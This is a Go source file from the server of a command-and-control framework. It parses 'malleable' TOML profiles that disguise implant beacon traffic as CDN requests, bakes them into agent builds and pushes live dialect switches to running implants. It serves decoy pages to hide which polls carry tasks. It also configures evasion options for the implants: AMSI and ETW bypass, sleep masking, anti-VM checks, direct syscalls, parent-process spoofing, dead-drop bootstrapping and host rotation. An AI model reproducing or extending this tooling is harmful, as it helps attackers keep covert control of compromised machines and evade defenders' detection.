package main

// profiles.go — Malleable C2 profile engine (server side)
//
// profiles/*.toml describe a WIRE DIALECT: POST/GET URIs, User-Agent and
// fixed HTTP headers that make the agent's traffic look like a specific
// application instead of a generic beacon.
//
// Server responsibilities:
//   1. Load + parse + validate every profile at startup (fail-soft per file,
//      loud in logs — a broken profile is skipped, never fatal).
//   2. GET /api/profiles        → list for the builder dialog combo box.
//   3. Build time               → bake the selected profile into the agent
//      config (endpoint/UA/headers), so the FIRST check-in already matches.
//   4. `profile <name>` command → resolve + push an update_profile task so a
//      RUNNING agent switches dialect without a rebuild.
//   5. Every listener registers the profile POST URIs, so requests to
//      /cdn/... style paths reach the agent handler (and everything else
//      still gets the nginx decoy 404).
//
// TOML schema (sections):
//   [profile]            name, version, description
//   [fronting]           informational (SNI/host fronting notes)
//   [http.get]           uri, verb
//   [http.get.headers]   fixed headers for GET
//   [http.post]          uri, verb
//   [http.post.headers]  fixed headers for POST
//   [http.get.server_output] / [http.post.client_output] — parsed, unused
//
// NOTE: section prefix must be "http." — the old "ttp." typo is rejected.

import (
        "encoding/json"
        "fmt"
        "log"
        "net/http"
        "os"
        "path/filepath"
        "regexp"
        "sort"
        "strconv"
        "strings"
        "sync"
        "time"
)

type ProfileHeader struct {
        Name  string `json:"name"`
        Value string `json:"value"`
}

type C2Profile struct {
        Name        string          `json:"name"`
        FileName    string          `json:"file_name"`
        Description string          `json:"description"`
        GetURI      string          `json:"get_uri"`
        PostURI     string          `json:"post_uri"`
        UserAgent   string          `json:"user_agent"`
        GetHeaders  []ProfileHeader `json:"get_headers"`
        PostHeaders []ProfileHeader `json:"post_headers"`
        // [timing] section — optional runtime overrides (parsed, passed through)
        SleepOverrideS       string `json:"-"`
        JitterOverride       string `json:"-"`
        WorkingHoursOverride string `json:"-"`

        // ── v3: full behavior sections (profile = operator's pointer into the
        // agent's baked capabilities; the agent binary carries the code, the
        // profile carries the switches) ─────────────────────────────────────
        // [http] poll = "post"|"get"
        PollMode string `json:"poll_mode"`
        // [timing] build-time defaults
        SleepS            string `json:"sleep_s"`
        JitterPercent     string `json:"jitter_percent"`
        JitterDistribution string `json:"jitter_distribution"`
        KillDate          string `json:"kill_date"`
        // [evasion] build-time switches between compiled code paths
        Amsi      string `json:"amsi"`
        Etw       string `json:"etw"`
        SleepMask string `json:"sleep_mask"`
        AntiVM    string `json:"anti_vm"`
        // [resilience] build-time retry/backoff/rotation knobs
        MaxErrors        string `json:"max_errors"`
        MaxRetries       string `json:"max_retries"`
        BackoffBaseMs    string `json:"backoff_base_ms"`
        BackoffMaxMs     string `json:"backoff_max_ms"`
        BackoffStrategy  string `json:"backoff_strategy"`
        InitialDelayMs   string `json:"initial_delay_ms"`
        InitialDelayMaxMs string `json:"initial_delay_max_ms"`
        FallbackPort     string `json:"fallback_port"`
        // [hosts] rotation targets (hostnames, comma-separated in TOML)
        HostList         string `json:"host_list"`
        RotationStrategy string `json:"rotation_strategy"`
        // [postex] spawn profile
        SpawnTo   string `json:"spawnto"`
        PPID      string `json:"ppid"`
        BlockDLLs string `json:"blockdlls"`
        // [bootstrap] dead-drop resolver (MITRE T1102.001)
        BootstrapMode  string `json:"bootstrap_mode"`
        BootstrapURL   string `json:"bootstrap_url"`
        BootstrapBegin string `json:"bootstrap_begin"`
        BootstrapEnd   string `json:"bootstrap_end"`
        // [evasion] runtime syscall masking via HERO FORGE
        DirectSys bool `json:"direct_sys"`
}

var (
        profileMu       sync.RWMutex
        profileRegistry = map[string]*C2Profile{} // keyed by name (no .toml)
)

// uri/header safety — also keeps URIs safe for Go 1.22 ServeMux patterns
// (a '{' or ' ' in a pattern would panic the mux).
var uriCharsetRe = regexp.MustCompile(`^/[A-Za-z0-9/_.\-]{0,255}$`)
var headerNameRe = regexp.MustCompile(`^[A-Za-z0-9\-]{1,64}$`)

func validHeaderName(n string) bool { return headerNameRe.MatchString(n) }

func validHeaderValue(v string) bool {
        if len(v) == 0 || len(v) > 256 {
                return false
        }
        return !strings.ContainsAny(v, "\r\n\x00")
}

// ── minimal TOML for our schema ────────────────────────────────────────────
// Handles: comments (#), [section.sub] headers, key = "string" | true | number.
// Anything else → error (loud, per-file).

type tomlDoc map[string]map[string]string

func parseTomlProfile(data []byte, fileName string) (*C2Profile, error) {
        doc := tomlDoc{}
        section := ""
        for lineNo, raw := range strings.Split(string(data), "\n") {
                line := strings.TrimSpace(raw)
                if line == "" || strings.HasPrefix(line, "#") {
                        continue
                }
                if strings.HasPrefix(line, "[") {
                        if !strings.HasSuffix(line, "]") {
                                return nil, fmt.Errorf("line %d: malformed section header", lineNo+1)
                        }
                        section = strings.TrimSpace(line[1 : len(line)-1])
                        // OLD TYPO GUARD: files used "[ttp.get]" — the h is required.
                        if strings.HasPrefix(section, "ttp.") || section == "ttp" {
                                return nil, fmt.Errorf("line %d: section [%s] — did you mean [http.%s]?",
                                        lineNo+1, section, strings.TrimPrefix(section, "ttp."))
                        }
                        if doc[section] == nil {
                                doc[section] = map[string]string{}
                        }
                        continue
                }
                eq := strings.Index(line, "=")
                if eq < 0 {
                        // Continuation of a multi-line array (e.g. ciphers = [ ... ])
                        // or stray token — ignore, keep parsing.
                        continue
                }
                key := strings.TrimSpace(line[:eq])
                val := strings.TrimSpace(line[eq+1:])
                val = stripTomlValue(val)
                if key == "" || section == "" {
                        return nil, fmt.Errorf("line %d: key %q outside any section", lineNo+1, key)
                }
                doc[section][key] = val
        }

        p := &C2Profile{FileName: fileName}
        if s := doc["profile"]; s != nil {
                p.Name = s["name"]
                p.Description = s["description"]
        }
        if p.Name == "" {
                p.Name = strings.TrimSuffix(fileName, ".toml")
        }
        if s := doc["http.get"]; s != nil {
                p.GetURI = s["uri"]
        }
        if s := doc["http.post"]; s != nil {
                p.PostURI = s["uri"]
        }
        // Optional global UA: [http.useragent].value > profile.user_agent > http.post.user_agent
        if s := doc["http.useragent"]; s != nil {
                p.UserAgent = s["value"]
        }
        if s := doc["profile"]; s != nil && p.UserAgent == "" {
                p.UserAgent = s["user_agent"]
        }
        if p.UserAgent == "" {
                if s := doc["http.post"]; s != nil {
                        p.UserAgent = s["user_agent"]
                }
        }
        // Optional [timing] overrides (runtime behavior changes)
        if s := doc["timing"]; s != nil {
                p.SleepOverrideS = s["sleep_override_s"]
                p.JitterOverride = s["jitter_override"]
                p.WorkingHoursOverride = s["working_hours"]
        }
        parseV3Sections(doc, p)
        for _, spec := range []struct {
                section string
                dst     *[]ProfileHeader
        }{
                {"http.get.headers", &p.GetHeaders},
                {"http.post.headers", &p.PostHeaders},
        } {
                if s := doc[spec.section]; s != nil {
                        keys := make([]string, 0, len(s))
                        for k := range s {
                                keys = append(keys, k)
                        }
                        sort.Strings(keys)
                        for _, k := range keys {
                                *spec.dst = append(*spec.dst, ProfileHeader{Name: k, Value: s[k]})
                        }
                }
        }
        return p, nil
}

// stripTomlValue — extract a scalar value: quoted string (taking content
// between the quotes, inline comment ignored) or bare token with any trailing
// "  # comment" removed.
func stripTomlValue(val string) string {
        if strings.HasPrefix(val, "\"") {
                if end := strings.Index(val[1:], "\""); end >= 0 {
                        return val[1 : 1+end]
                }
                return strings.Trim(val, "\"")
        }
        if strings.HasPrefix(val, "'") {
                if end := strings.Index(val[1:], "'"); end >= 0 {
                        return val[1 : 1+end]
                }
                return strings.Trim(val, "'")
        }
        if i := strings.Index(val, "#"); i >= 0 {
                val = strings.TrimSpace(val[:i])
        }
        return val
}

// parseV3Sections — v3 behavior sections. The mini TOML parser is scalar-only,
// so list-valued keys ([hosts].list) are comma-separated strings.
func parseV3Sections(doc tomlDoc, p *C2Profile) {
        if s := doc["http"]; s != nil {
                p.PollMode = s["poll"]
        }
        if s := doc["timing"]; s != nil {
                p.SleepS = s["sleep_s"]
                p.JitterPercent = s["jitter_percent"]
                p.JitterDistribution = s["jitter_distribution"]
                p.KillDate = s["kill_date"]
        }
        if s := doc["evasion"]; s != nil {
                p.Amsi = s["amsi"]
                p.Etw = s["etw"]
                p.SleepMask = s["sleep_mask"]
                p.AntiVM = s["anti_vm"]
        }
        if s := doc["resilience"]; s != nil {
                p.MaxErrors = s["max_errors"]
                p.MaxRetries = s["max_retries"]
                p.BackoffBaseMs = s["backoff_base_ms"]
                p.BackoffMaxMs = s["backoff_max_ms"]
                p.BackoffStrategy = s["backoff_strategy"]
                p.InitialDelayMs = s["initial_delay_ms"]
                p.InitialDelayMaxMs = s["initial_delay_max_ms"]
                p.FallbackPort = s["fallback_port"]
        }
        if s := doc["hosts"]; s != nil {
                p.HostList = s["list"]
                p.RotationStrategy = s["strategy"]
        }
        if s := doc["postex"]; s != nil {
                p.SpawnTo = s["spawnto"]
                p.PPID = s["ppid"]
                p.BlockDLLs = s["blockdlls"]
        }
        if s := doc["bootstrap"]; s != nil {
                p.BootstrapMode = s["mode"]
                p.BootstrapURL = s["url"]
                p.BootstrapBegin = s["begin"]
                p.BootstrapEnd = s["end"]
        }
        if s := doc["evasion"]; s != nil {
                p.DirectSys = (s["direct_sys"] == "true")
        }
}

// profileInt — parse a non-negative integer config string; ""/invalid → 0.
func profileInt(s string) int {
        s = strings.TrimSpace(s)
        if s == "" {
                return 0
        }
        n, err := strconv.Atoi(s)
        if err != nil || n < 0 {
                return 0
        }
        return n
}

// profTimingStr — profile [timing] lookup used by build-time resolution.
func profTimingStr(p *C2Profile, key string) string {
        if p == nil {
                return ""
        }
        switch key {
        case "sleep_s":
                return p.SleepS
        case "jitter_percent":
                return p.JitterPercent
        }
        return ""
}

// ProfileHosts — split the comma-separated [hosts].list into hostnames
// (de-duped, max 4). Entries are "host" or "host:port" (v3 dials every host
// on the listener's port; per-entry ports are accepted and logged).
func ProfileHosts(p *C2Profile) []string {
        out := []string{}
        seen := map[string]bool{}
        for _, h := range strings.Split(p.HostList, ",") {
                h = strings.TrimSpace(h)
                if h == "" || seen[h] {
                        continue
                }
                seen[h] = true
                out = append(out, h)
                if len(out) >= 4 {
                        break
                }
        }
        return out
}

// validateProfile enforces the safety contract (mirrors the agent side).
func validateProfile(p *C2Profile) error {
        if p.PostURI == "" {
                return fmt.Errorf("[%s] http.post.uri is required — the agent POSTs task traffic", p.Name)
        }
        if !uriCharsetRe.MatchString(p.PostURI) {
                return fmt.Errorf("[%s] http.post.uri invalid (start with '/', charset A-Za-z0-9/_.-, max 256): %q", p.Name, p.PostURI)
        }
        if p.GetURI != "" && !uriCharsetRe.MatchString(p.GetURI) {
                return fmt.Errorf("[%s] http.get.uri invalid: %q", p.Name, p.GetURI)
        }
        if p.UserAgent != "" && !validHeaderValue(p.UserAgent) {
                return fmt.Errorf("[%s] user_agent invalid (1-256 chars, no CR/LF)", p.Name)
        }
        if len(p.PostHeaders) > 8 {
                return fmt.Errorf("[%s] too many POST headers (max 8)", p.Name)
        }
        if len(p.GetHeaders) > 8 {
                return fmt.Errorf("[%s] too many GET headers (max 8)", p.Name)
        }
        dropped := 0
        cleanPost := make([]ProfileHeader, 0, len(p.PostHeaders))
        for _, h := range p.PostHeaders {
                ln := strings.ToLower(h.Name)
                // transport-owned headers are silently dropped (the agent's HTTP
                // stack owns them) — the rest of the file stays valid.
                if ln == "host" || ln == "content-length" || ln == "transfer-encoding" {
                        dropped++
                        continue
                }
                if !validHeaderName(h.Name) {
                        return fmt.Errorf("[%s] bad header name %q (A-Za-z0-9-, max 64)", p.Name, h.Name)
                }
                if !validHeaderValue(h.Value) {
                        return fmt.Errorf("[%s] bad value for header %q (1-256 chars, no CR/LF)", p.Name, h.Name)
                }
                cleanPost = append(cleanPost, h)
        }
        cleanGet := make([]ProfileHeader, 0, len(p.GetHeaders))
        for _, h := range p.GetHeaders {
                ln := strings.ToLower(h.Name)
                if ln == "host" || ln == "content-length" || ln == "transfer-encoding" {
                        dropped++
                        continue
                }
                if !validHeaderName(h.Name) {
                        return fmt.Errorf("[%s] bad header name %q (A-Za-z0-9-, max 64)", p.Name, h.Name)
                }
                if !validHeaderValue(h.Value) {
                        return fmt.Errorf("[%s] bad value for header %q (1-256 chars, no CR/LF)", p.Name, h.Name)
                }
                cleanGet = append(cleanGet, h)
        }
        p.PostHeaders, p.GetHeaders = cleanPost, cleanGet
        // Transport-owned header stripping is by-design and silent — it is
        // not a condition the operator can act on, so it must not add one
        // log line per profile at every startup.
        _ = dropped
        // ── v3 behavior sections ───────────────────────────────────────────
        if p.PollMode != "" && p.PollMode != "post" && p.PollMode != "get" {
                return fmt.Errorf("[%s] [http].poll must be post|get (got %q)", p.Name, p.PollMode)
        }
        if p.PollMode == "get" && p.GetURI == "" {
                return fmt.Errorf("[%s] poll=get requires [http.get].uri", p.Name)
        }
        if p.SleepOverrideS != "" && !validNum(p.SleepOverrideS, 0, 604800) {
                return fmt.Errorf("[%s] [timing].sleep_override_s must be 0..604800", p.Name)
        }
        if p.SleepS != "" && !validNum(p.SleepS, 1, 604800) {
                return fmt.Errorf("[%s] [timing].sleep_s must be 1..604800", p.Name)
        }
        if p.JitterPercent != "" && !validNum(p.JitterPercent, 0, 100) {
                return fmt.Errorf("[%s] [timing].jitter_percent must be 0..100", p.Name)
        }
        switch p.JitterDistribution {
        case "", "uniform", "gaussian", "exponential":
        default:
                return fmt.Errorf("[%s] [timing].jitter_distribution must be uniform|gaussian|exponential", p.Name)
        }
        if p.KillDate != "" {
                if _, err := time.Parse("2006-01-02", p.KillDate); err != nil {
                        return fmt.Errorf("[%s] [timing].kill_date must be YYYY-MM-DD", p.Name)
                }
        }
        validChoice := func(field, v string, allowed ...string) error {
                for _, a := range allowed {
                        if v == a {
                                return nil
                        }
                }
                return fmt.Errorf("[%s] %s must be one of: %s (got %q)", p.Name, field, strings.Join(allowed, "|"), v)
        }
        if p.Amsi != "" {
                if err := validChoice("[evasion].amsi", p.Amsi, "none", "hwbp"); err != nil {
                        return err
                }
        }
        if p.Etw != "" {
                if err := validChoice("[evasion].etw", p.Etw, "none", "hwbp"); err != nil {
                        return err
                }
        }
        if p.SleepMask != "" {
                if err := validChoice("[evasion].sleep_mask", p.SleepMask, "none", "shadow7"); err != nil {
                        return err
                }
        }
        if p.AntiVM != "" {
                if err := validChoice("[evasion].anti_vm", p.AntiVM, "none", "all"); err != nil {
                        return err
                }
        }
        if p.MaxErrors != "" && !validNum(p.MaxErrors, 1, 4294967295) {
                return fmt.Errorf("[%s] [resilience].max_errors must be 1..4294967295", p.Name)
        }
        if p.MaxRetries != "" && !validNum(p.MaxRetries, 0, 4294967295) {
                return fmt.Errorf("[%s] [resilience].max_retries must be 0..4294967295", p.Name)
        }
        if p.BackoffBaseMs != "" && !validNum(p.BackoffBaseMs, 1000, 4294967295) {
                return fmt.Errorf("[%s] [resilience].backoff_base_ms must be >= 1000", p.Name)
        }
        if p.BackoffMaxMs != "" && !validNum(p.BackoffMaxMs, 1000, 4294967295) {
                return fmt.Errorf("[%s] [resilience].backoff_max_ms must be >= 1000", p.Name)
        }
        switch p.BackoffStrategy {
        case "", "exponential", "fixed", "random":
        default:
                return fmt.Errorf("[%s] [resilience].backoff_strategy must be exponential|fixed|random", p.Name)
        }
        switch p.RotationStrategy {
        case "", "failover", "round_robin", "random":
        default:
                return fmt.Errorf("[%s] [hosts].strategy must be failover|round_robin|random", p.Name)
        }
        for _, h := range ProfileHosts(p) {
                hostPart := h
                if i := strings.LastIndex(h, ":"); i >= 0 {
                        hostPart = h[:i]
                        if !validNum(h[i+1:], 1, 65535) {
                                return fmt.Errorf("[%s] [hosts].list entry %q has bad port", p.Name, h)
                        }
                }
                if len(hostPart) < 3 || len(hostPart) > 253 || !hostRe.MatchString(hostPart) {
                        return fmt.Errorf("[%s] [hosts].list entry %q is not a valid hostname", p.Name, h)
                }
        }
        if p.SpawnTo != "" && (len(p.SpawnTo) > 260 || strings.ContainsAny(p.SpawnTo, "\r\n\x00")) {
                return fmt.Errorf("[%s] [postex].spawnto invalid (max 260 chars, no control chars)", p.Name)
        }
        if p.PPID != "" && !imageRe.MatchString(p.PPID) {
                return fmt.Errorf("[%s] [postex].ppid must be an image name like explorer.exe", p.Name)
        }
        switch p.BootstrapMode {
        case "", "direct", "deaddrop":
        default:
                return fmt.Errorf("[%s] [bootstrap].mode must be direct|deaddrop", p.Name)
        }
        if p.BootstrapMode == "deaddrop" {
                if p.BootstrapURL == "" {
                        return fmt.Errorf("[%s] bootstrap mode=deaddrop requires [bootstrap].url", p.Name)
                }
                if !strings.HasPrefix(p.BootstrapURL, "https://") {
                        return fmt.Errorf("[%s] [bootstrap].url must be https:// (dead-drop fetch runs on public TLS)", p.Name)
                }
                if len(p.BootstrapURL) > 512 {
                        return fmt.Errorf("[%s] [bootstrap].url too long (max 512)", p.Name)
                }
        }
        return nil
}

var hostRe = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$`)
var imageRe = regexp.MustCompile(`^[A-Za-z0-9._-]{1,64}$`)

func validNum(s string, min, max int) bool {
        n := profileInt(s)
        return n >= min && n <= max
}

// FindProfilesDir locates the profiles/ directory.
func FindProfilesDir() string {
        if v := os.Getenv("HERO_PROFILES_DIR"); v != "" {
                return v
        }
        for _, c := range []string{"../profiles", "./profiles", "../../profiles"} {
                if m, _ := filepath.Glob(filepath.Join(c, "*.toml")); len(m) > 0 {
                        return c
                }
        }
        return ""
}

// LoadProfiles parses every *.toml in dir into the registry (fail-soft).
func LoadProfiles(dir string) {
        if dir == "" {
                log.Printf("[PROFILES] no profiles directory found — malleable profiles disabled")
                return
        }
        files, _ := filepath.Glob(filepath.Join(dir, "*.toml"))
        if len(files) == 0 {
                log.Printf("[PROFILES] %s has no .toml files", dir)
                return
        }
        sort.Strings(files)
        loaded, skipped := 0, 0
        for _, f := range files {
                data, err := os.ReadFile(f)
                if err != nil {
                        log.Printf("[PROFILES] read %s: %v", f, err)
                        skipped++
                        continue
                }
                p, err := parseTomlProfile(data, filepath.Base(f))
                if err != nil {
                        log.Printf("[PROFILES] SKIP %s: %v", filepath.Base(f), err)
                        skipped++
                        continue
                }
                if err := validateProfile(p); err != nil {
                        log.Printf("[PROFILES] SKIP %s: %v", filepath.Base(f), err)
                        skipped++
                        continue
                }
                profileMu.Lock()
                profileRegistry[p.Name] = p
                profileMu.Unlock()
                loaded++
        }
        // Single-line startup summary — per-profile noise stays out of the
        // console. Broken profiles still surface via the SKIP lines above.
        log.Printf("[PROFILES] %d loaded, %d skipped (dir: %s)", loaded, skipped, dir)
}

// GetProfile by name — accepts "cloudfront" or "cloudfront.toml".
func GetProfile(name string) *C2Profile {
        name = strings.TrimSpace(strings.TrimSuffix(strings.TrimSpace(name), ".toml"))
        if name == "" || strings.EqualFold(name, "none") {
                return nil
        }
        profileMu.RLock()
        defer profileMu.RUnlock()
        return profileRegistry[name]
}

// ListProfiles returns registry contents sorted by name.
func ListProfiles() []*C2Profile {
        profileMu.RLock()
        defer profileMu.RUnlock()
        names := make([]string, 0, len(profileRegistry))
        for n := range profileRegistry {
                names = append(names, n)
        }
        sort.Strings(names)
        out := make([]*C2Profile, 0, len(names))
        for _, n := range names {
                out = append(out, profileRegistry[n])
        }
        return out
}

// ProfileBakeJSON renders the profile as the JSON the agent bakes/applies:
// {"name","endpoint","user_agent","headers":{k:v}} (POST headers) plus
// v4: {"get_headers":{k:v}} when the profile ships a GET-poll dialect —
// the agent's poll_get applies get_headers when present and falls back to
// POST headers for older bakes (pre-v4 behaviour preserved).
func ProfileBakeJSON(p *C2Profile) string {
        headers := map[string]string{}
        for _, h := range p.PostHeaders {
                headers[h.Name] = h.Value
        }
        // v4: GET-poll header dialect (GetHeaders already cleaned by
        // validateProfile — transport-owned headers were dropped there).
        getHeaders := map[string]string{}
        for _, h := range p.GetHeaders {
                getHeaders[h.Name] = h.Value
        }
        // v3: numbers bake as REAL numbers — the agent parses them with
        // as_f64/as_i64 (v2 sent strings, so sleep_override_s silently no-oped
        // on update_profile tasks — fixed here).
        timing := map[string]interface{}{}
        if n := profileInt(p.SleepOverrideS); n > 0 {
                timing["sleep_override_s"] = n
        }
        if p.JitterOverride != "" {
                if f, err := strconv.ParseFloat(strings.TrimSpace(p.JitterOverride), 64); err == nil && f > 0 && f <= 100 {
                        timing["jitter_override"] = f
                }
        }
        if p.WorkingHoursOverride != "" {
                timing["working_hours"] = p.WorkingHoursOverride
        }
        if n := profileInt(p.SleepS); n > 0 {
                timing["sleep_s"] = n
        }
        if n := profileInt(p.JitterPercent); n > 0 {
                timing["jitter_percent"] = n
        }
        bake := map[string]interface{}{
                "name":       p.Name,
                "endpoint":   p.PostURI,
                "user_agent": p.UserAgent,
                "headers":    headers,
                "timing":     timing,
        }
        if p.GetURI != "" {
                bake["get_endpoint"] = p.GetURI
        }
        if len(getHeaders) > 0 {
                bake["get_headers"] = getHeaders
        }
        if p.PollMode != "" {
                bake["poll_mode"] = p.PollMode
        }
        if p.SpawnTo != "" || p.PPID != "" || p.BlockDLLs == "true" {
                bake["postex"] = map[string]interface{}{
                        "spawnto":   p.SpawnTo,
                        "direct_sys": p.DirectSys,
                        "ppid":      p.PPID,
                        "blockdlls": p.BlockDLLs == "true",
                }
        }
        // Build-time-only sections — the agent acknowledges + ignores them at
        // runtime (they live in the encrypted bake before first network byte).
        if p.Amsi != "" || p.Etw != "" || p.SleepMask != "" || p.AntiVM != "" {
                bake["evasion"] = map[string]string{
                        "amsi": p.Amsi, "etw": p.Etw, "sleep_mask": p.SleepMask, "anti_vm": p.AntiVM,
                }
        }
        if hosts := ProfileHosts(p); len(hosts) > 0 {
                bake["hosts"] = map[string]interface{}{
                        "list":     hosts,
                        "strategy": p.RotationStrategy,
                }
        }
        if p.BootstrapMode != "" {
                bake["bootstrap"] = map[string]string{
                        "mode": p.BootstrapMode, "url": p.BootstrapURL,
                        "begin": p.BootstrapBegin, "end": p.BootstrapEnd,
                }
        }
        if p.KillDate != "" {
                bake["kill_date"] = p.KillDate
        }
        blob, err := json.Marshal(bake)
        if err != nil {
                return ""
        }
        return string(blob)
}

// ListProfileNames — quick name list for error messages / UI fallbacks.
func ListProfileNames() []string {
        names := make([]string, 0)
        for _, p := range ListProfiles() {
                names = append(names, p.Name)
        }
        return names
}

// handleListProfiles — GET /api/profiles (operator API): the builder dialog
// combo box is populated from this list.
func handleListProfiles(w http.ResponseWriter, r *http.Request) {
        writeJSON(w, http.StatusOK, ListProfiles())
}

// SetupProfileRoutes — register the malleable profile URIs on a mux so that
// profile-dialect requests (e.g. POST /cdn/beacon/v3/submit) reach the agent
// handler. Everything else keeps hitting the nginx decoy routes.
//
// v3: the GET uri is registered whenever it exists — NOT keyed on the baked
// poll mode, because poll_mode is runtime-switchable (`profile <name>` can
// flip a POST-poll agent into GET-poll mid-session). An unused GET route is
// inert; a missing one makes the agent permanently task-deaf.
func SetupProfileRoutes(mux *http.ServeMux) {
        for _, p := range ListProfiles() {
                mux.HandleFunc("POST "+p.PostURI, handleAgentC2)
                if p.GetURI != "" {
                        mux.HandleFunc("GET "+p.GetURI, handleAgentGetPoll)
                }
        }
}

// handleAgentGetPoll — v3 GET-poll task delivery (poll_mode=get dialects).
//
// Wire contract (mirrors implant comms.rs::poll_get):
//   Agent  : GET <get_uri>?v=<first 8 chars of session_id>  (+ profile headers)
//   Server : 200 + body == session_prefix || EncryptToAgent(envelope) → tasks
//            200 + decoy body (≠ prefix)                             → no tasks
//            404                                                     → unknown session
//
// A decoy no-task response is REQUIRED: the implant treats any body that
// doesn't start with its session prefix as "nothing this cycle". Serving
// real-looking content on the quiet path keeps the GET stream bland; only
// task-carrying responses differ from CDN noise.
func handleAgentGetPoll(w http.ResponseWriter, r *http.Request) {
        if !IsAllowedIP(r.RemoteAddr) {
                log.Printf("[C2] BLOCKED GET-poll from %s (IP filter)", r.RemoteAddr)
                w.WriteHeader(http.StatusForbidden)
                return
        }

        v := r.URL.Query().Get("v")
        if len(v) != 8 {
                // No/short token — random scanner or misrouted browser hit.
                // Never educate the sender; just serve the decoy page.
                handleDecoy200(w, r)
                return
        }
        if sessionMgr == nil {
                // Server not initialised (defensive) — behave like noise.
                handleDecoy200(w, r)
                return
        }
        s := sessionMgr.FindByIDPrefix(v)
        if s == nil {
                // Mirror the POST heartbeat's 404: the agent's error path
                // (backoff → rekey → host rotation) only triggers on real
                // HTTP errors, and a dead session must NOT look like a
                // quiet cycle.
                log.Printf("[C2] GET-poll unknown session prefix %q from %s", v, r.RemoteAddr)
                w.WriteHeader(http.StatusNotFound)
                return
        }
        if !sessionMgr.UpdateSession(s.ID) {
                w.WriteHeader(http.StatusNotFound)
                return
        }

        wireTasks := buildWireTasks(sessionMgr.GetPendingTasks(s.ID))
        if len(wireTasks) == 0 {
                handleDecoy200(w, r)
                return
        }

        respEnv := ServerEnvelope{
                MsgType:   "heartbeat_ack",
                SessionID: s.ID,
                Data: ServerResponseData{
                        SessionID: s.ID,
                        Tasks:     wireTasks,
                        FastPoll:  true,
                },
                Ts: time.Now().Unix(),
        }
        envJSON, err := json.Marshal(respEnv)
        if err != nil {
                w.WriteHeader(http.StatusInternalServerError)
                return
        }
        encrypted, err := s.Crypto.EncryptToAgent(envJSON)
        if err != nil {
                w.WriteHeader(http.StatusInternalServerError)
                return
        }
        w.Header().Set("Content-Type", "application/octet-stream")
        w.Write([]byte(s.ID[:8]))
        w.Write(encrypted)
        log.Printf("[C2] GET-poll OK: %s (%s@%s) tasks=%d", s.ID[:8], s.Username, s.Hostname, len(wireTasks))
}

// TryProfileCommand — intercepts the operator session command
//
//      profile <name>
//
// and converts it into an update_profile task with the baked JSON dialect.
// Returns (true, handledResponse) when the command was a profile command.
func TryProfileCommand(command, args string) (bool, string, string) {
        cmd := strings.ToLower(strings.TrimSpace(command))
        if cmd != "profile" && cmd != "!profile" {
                return false, "", ""
        }
        name := strings.TrimSpace(args)
        if i := strings.IndexAny(name, " \t"); i >= 0 {
                name = strings.TrimSpace(name[:i])
        }
        if name == "" {
                return true, "", "usage: profile <name> — available: " + strings.Join(ListProfileNames(), ", ")
        }
        p := GetProfile(name)
        if p == nil {
                return true, "", "profile not found: " + name + " — available: " + strings.Join(ListProfileNames(), ", ")
        }
        return true, "update_profile", ProfileBakeJSON(p)
}
